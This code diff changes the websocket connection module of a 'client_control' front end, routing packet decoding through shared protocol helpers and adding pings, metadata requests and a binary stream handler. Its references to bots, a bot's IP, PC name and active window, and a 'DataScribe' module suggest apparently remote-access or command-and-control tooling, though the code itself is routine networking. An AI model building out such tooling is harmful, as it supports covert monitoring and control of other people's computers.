@@ -1,5 +1,6 @@
 /* frontend/client_control/js/modules/websocket/connection.js */
 import { AppState } from '../core/states.js';
+import { decodePacket, encodePacket, isJson } from '../../../../dashboard/js/modules/websocket/protocol.js';
 
 let socket = null, botWatchdog = null;
 
@@ -16,32 +17,29 @@ const setOnline = (isOnline) => {
 };
 
 function handleIncomingData(buffer) {
-    try {
-        const view = new DataView(buffer);
-        const dec = new TextDecoder();
+    const pkg = decodePacket(buffer);
+    if (!pkg || pkg.id !== AppState.clientId) return;
 
-        const idLen = view.getUint8(0);
-        const incomingId = dec.decode(new Uint8Array(buffer, 1, idLen));
-        if (incomingId !== AppState.clientId) return;
+    if (isJson(pkg.module)) {
+        try {
+            const data = JSON.parse(new TextDecoder().decode(pkg.payload));
 
-        const modLen = view.getUint8(1 + idLen);
-        const payOff = 6 + idLen + modLen;
-        const payLen = view.getUint32(2 + idLen + modLen, false);
-        const data = JSON.parse(dec.decode(new Uint8Array(buffer, payOff, payLen)));
+            // Обновляем только те поля, что есть в HTML
+            if (data.ip || data.id) {
+                updateUI('display-id', data.id || pkg.id);
+                updateUI('display-ip', data.ip);
+            }
 
-        // 1. Метаданные из БД или активное окно
-        updateUI('bot-ip-display', data.ip);
-        updateUI('bot-pc-display', data.pc_name);
-        updateUI('bot-id-display', data.id);
-        updateUI('bot-window-display', data.activeWindow);
-
-        // 2. Живой Heartbeat
-        if (data.net === "heartbeat") {
+            // Статус Online
             setOnline(true);
             clearTimeout(botWatchdog);
-            botWatchdog = setTimeout(() => setOnline(false), 5000);
-        }
-    } catch (e) { console.error("[WS] Parse error", e); }
+            botWatchdog = setTimeout(() => setOnline(false), 10000);
+
+        } catch (e) { console.error("[WS] JSON Error"); }
+    } else {
+        // Бинарные данные (стрим)
+        window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
+    }
 }
 
 export function initControlConnection() {
@@ -53,12 +51,18 @@ export function initControlConnection() {
     socket.binaryType = 'arraybuffer';
 
     socket.onmessage = (e) => (e.data instanceof ArrayBuffer) && handleIncomingData(e.data);
-    socket.onopen = () => console.log("[WS] Connected");
+
+    socket.onopen = () => {
+        console.log("[WS] Connected. Metadata requested.");
+        window.sendToBot("DataScribe", "get_metadata");
+        setInterval(() => socket?.readyState === 1 && socket.send(encodePacket("SERVER", "ping")), 25000);
+    };
+
     socket.onclose = () => { setOnline(false); clearTimeout(botWatchdog); };
 
     window.sendToBot = (mod, pay) => {
         if (socket?.readyState === 1) {
-            import('./sender.js').then(m => socket.send(m.encodePacket(AppState.clientId, mod, pay)));
+            socket.send(encodePacket(AppState.clientId, mod, pay));
         }
     };
 }
